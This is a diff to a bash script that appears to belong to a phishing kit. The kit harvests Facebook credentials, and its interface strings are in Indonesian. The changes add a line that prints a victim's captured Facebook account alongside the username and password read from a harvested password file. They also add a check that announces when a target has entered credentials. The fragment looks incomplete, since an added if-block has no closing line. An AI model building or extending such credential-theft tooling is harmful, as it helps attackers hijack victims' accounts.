@@ -13,6 +13,7 @@ facebook=$(grep -o 'akun:*' server/server/password.txt | cut -d " " -f2 )
 password=$(grep -o 'password:*' server/server/password.txt | cut -d " " -f2 )
 username=$(grep -o 'Account:*' server/server/password.txt | cut -d " " -f2 )
 printf '\n'
+printf "\033[34;1m[\033[31;1m+\033[34;1m]\033[33;1mAkun Fb:" $facebook
 printf "\033[34;1m[\033[31;1m+\033[34;1m]\033[33;1mUsername:" $username
 printf '\n'
 printf "\033[34;1m[\033[31;1m+\033[34;1m]\033[33;1mPassword:" $password
@@ -33,7 +34,8 @@ rm -rf ip.txt
 fi
 
 sleep 0.5
-
+if [[ -e "server/$server/password.txt" ]]; then
+printf "\n\e[1;93m[\e[0m*\e[1;93m]\e[0m\e[1;92m Target menulis!\n"
 password
 
 done 
